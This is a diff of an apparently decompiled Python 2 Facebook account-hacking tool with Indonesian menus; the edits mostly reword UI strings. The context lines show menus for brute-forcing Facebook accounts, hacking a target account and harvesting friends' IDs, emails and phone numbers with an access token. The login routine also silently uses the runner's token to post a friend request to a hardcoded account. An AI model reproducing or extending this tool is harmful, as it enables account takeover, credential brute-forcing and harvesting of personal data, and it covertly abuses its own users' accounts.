@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by Mastah ID
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -29,7 +29,7 @@ def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLagi masuk cuk \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://www.youtube.com/channel/UCBTDFlXcThUcm4z6lzrr8rQ ')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -105,12 +105,12 @@ def login():
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93mAkun lu kena checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
         else:
-            print '\n\x1b[1;91m[!] Login Gagal'
+            print '\n\x1b[1;91m[!] Gagal login'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
@@ -122,7 +122,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Akun tidak ditemukan'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -147,10 +147,10 @@ def menu():
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m1. Info pengguna     '
+    print '\x1b[1;37;40m2. Hacking akun fb   '
     print '\x1b[1;37;40m3. Bot               '
-    print '\x1b[1;37;40m4. Lainnya....       '
+    print '\x1b[1;37;40m4. Lainnya...        '
     print '\x1b[1;37;40m5. LogOut            '
     print '\x1b[1;31;40m0. Keluar            '
     print
@@ -201,7 +201,7 @@ def informasi():
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu eak cuk \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
     for p in cok['data']:
@@ -212,7 +212,7 @@ def informasi():
             try:
                 print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
             except KeyError:
-                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
+                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mGak ada'
             else:
                 try:
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
@@ -263,7 +263,7 @@ def menu_hack():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token gk ketemu'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -271,12 +271,12 @@ def menu_hack():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
-    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
-    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
+    print '\x1b[1;37;40m1. Hack fb kecil kecilan(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m2. BruteForce Fb'
+    print '\x1b[1;37;40m3. Super Duper Bruteforce Facebook'
     print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
-    print '\x1b[1;37;40m5. Yahoo Checker'
-    print '\x1b[1;37;40m6. Ambil id/email/hp'
+    print '\x1b[1;37;40m5. Email Checker'
+    print '\x1b[1;37;40m6. Ngambil id/email/hp'
     print '\x1b[1;31;40m0. Kembali'
     print
     hack_pilih()
